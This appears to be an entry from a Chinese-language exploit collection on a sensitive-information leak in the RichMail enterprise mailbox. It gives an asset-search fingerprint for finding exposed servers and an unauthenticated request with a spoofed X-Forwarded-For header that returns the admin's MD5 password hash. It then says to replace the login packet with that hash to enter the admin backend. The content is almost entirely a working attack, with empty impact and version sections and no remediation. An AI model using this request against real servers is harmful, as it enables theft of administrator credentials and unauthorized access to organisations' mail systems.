# RichMail企业邮箱敏感信息泄漏漏洞

- **系统**：RichMail　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app="Richmail-企业邮箱"`
- **请求**：`GET /RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin HTTP/1.1`

**请求体 / payload**
```
按需调整`X-Forwarded-For: 127.0.0.1`
Host: xx.xx.xx.xx
Cookie: lang=zh_CN
X-Forwarded-For: 127.0.0.1
Sec-Fetch-User: ?1

获取管理员MD5加密值后抓去登陆数据包替换即可进入后台\

```

**其他**
- RichMail 企业邮箱敏感信息泄漏漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RichMail 企业邮箱